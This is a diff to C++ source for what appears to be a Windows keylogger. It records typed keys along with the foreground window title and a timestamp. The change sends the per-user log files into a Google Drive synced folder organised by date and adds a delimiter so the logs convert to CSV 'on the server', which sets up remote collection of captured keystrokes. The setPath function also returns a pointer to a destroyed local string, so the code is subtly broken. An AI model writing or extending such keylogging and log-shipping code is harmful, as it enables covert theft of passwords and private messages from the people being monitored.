@@ -10,53 +10,82 @@ using namespace std;
 char FILENAME[256];
 wchar_t prev_window[256];
 wchar_t curr_window[256];
+string DELIM = "[&&]"; //Delimeter added for easy conversion of log files to csv on the server
+
+const char* setPath(){
+    string gdrivepath = "G:/My Drive/Logs/";
+
+    //----Extracting today's date---//
+    time_t curr_datetime = time(NULL);
+    tm *timeptr = localtime(&curr_datetime);
+    char datebuf[11];
+    strftime(datebuf, sizeof(datebuf), "%Y-%m-%d", timeptr); // YYYY-MM-DD format
+
+    //-------Creating a directory named today's date----//
+    gdrivepath += string(datebuf);
+    wstring temp(gdrivepath.begin(), gdrivepath.end());
+    LPCWSTR GoogleDriveDirectory = temp.c_str();
+    CreateDirectoryW(GoogleDriveDirectory, NULL);
+    gdrivepath += "/";
+    return gdrivepath.c_str();
+}
 
 void SetFileName()
 {
     char username[UNLEN + 1];
     DWORD usernamelen = UNLEN + 1;
     GetUserNameA(username, &usernamelen);
-    // wstring uname(username);
-    strcpy(FILENAME, username);
+    strcpy(FILENAME, setPath());
+    strcat(FILENAME, username);
     strcat(FILENAME, ".log");
 }
 
-void Write(string key)
-{
-    wchar_t windowname[256];
-    HWND fgwindowhandler = GetForegroundWindow();
-    GetWindowTextW(fgwindowhandler, (wchar_t *)curr_window, sizeof(curr_window));
+string formattedDateTime(){
+    time_t curr_datetime=time(NULL);
+    tm *timeptr = localtime(&curr_datetime); //tm structure has calendar like fields
+    // char *fulldatetime = ctime(&curr_datetime); //DAY MON DD HH:MM:SS YYYY format
+    char datebuf[11];
+    strftime(datebuf, sizeof(datebuf), "%Y-%m-%d", timeptr); // YYYY-MM-DD format
+    char timebuf[9];
+    strftime(timebuf, sizeof(timebuf), "%H:%M:%S", timeptr); // HH:MM:SS format (24 hr)
+    string date_time = string(datebuf) + DELIM + string(timebuf);
+    return date_time;
+}
 
-    ofstream fout(FILENAME, ios::app);
-    if (fout.is_open())
+    void Write(string key)
     {
-        string towrite = "";
-        if (wcscmp(prev_window, curr_window) != 0) // current window != previous window
-        {
-            wstring _cwindow(curr_window);
-            string temp(_cwindow.begin(), _cwindow.end());
-            towrite += "\n&&" + temp;
-            towrite += "\t";
-            time_t current_time = time(NULL);
-            char *dt = ctime(&current_time);
-            towrite += "&&";
-            towrite += dt;
-            towrite += "\t";
-            towrite += "&&";
-            towrite += key;
-            wcscpy(prev_window, curr_window);
-        }
-        /*else if(fgwindowhandler)
-        {
+        wchar_t windowname[256];
+        HWND fgwindowhandler = GetForegroundWindow();
+        GetWindowTextW(fgwindowhandler, (wchar_t *)curr_window, sizeof(curr_window));
 
-        }*/
+        ofstream fout(FILENAME, ios::app);
+        if (fout.is_open())
+        {
+            string towrite = "";
+            if (wcscmp(prev_window, curr_window) != 0) // current window != previous window
+            {
+                wstring _cwindow(curr_window);
+                string fgwindowname(_cwindow.begin(), _cwindow.end());
+                towrite += "\n" + DELIM + fgwindowname; //Foreground window name
+                towrite += "\t";
+                towrite += DELIM;
+                towrite += formattedDateTime();
+                towrite += "\t";
+                towrite += DELIM;
+                towrite += key; //Content
+                wcscpy(prev_window, curr_window);
+            }
+            /*else if(fgwindowhandler)
+            {
+
+            }*/
+            else
+                towrite += key;
+            fout.write(towrite.c_str(), towrite.length());
+            fout.close();
+        }
         else
-            towrite += key;
-        fout.write(towrite.c_str(), towrite.length());
-        fout.close();
-    }
-    else
-        cout << "\nUnable to open file\n";
+            cout << "\nUnable to open file\n";
 }
 
 bool shift = false, caps = false, numlock = false;
